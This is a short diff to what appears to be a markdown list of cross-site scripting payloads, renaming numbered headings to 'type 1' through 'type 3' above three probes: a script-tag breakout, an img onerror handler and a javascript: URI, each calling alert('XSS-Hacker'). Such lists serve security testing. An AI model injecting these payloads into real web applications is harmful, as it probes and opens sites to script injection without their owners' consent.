@@ -1,14 +1,14 @@
-> 1
+> type 1
 ```
 "><script>alert('XSS-Hacker')</script>
 ```
 
-> 2
+> type 2
 ```
 <img src=x onerror=alert('XSS-Hacker')>
 ```
 
-> 3
+> type 3
 ```
 javascript:alert('XSS-Hacker')
 ```
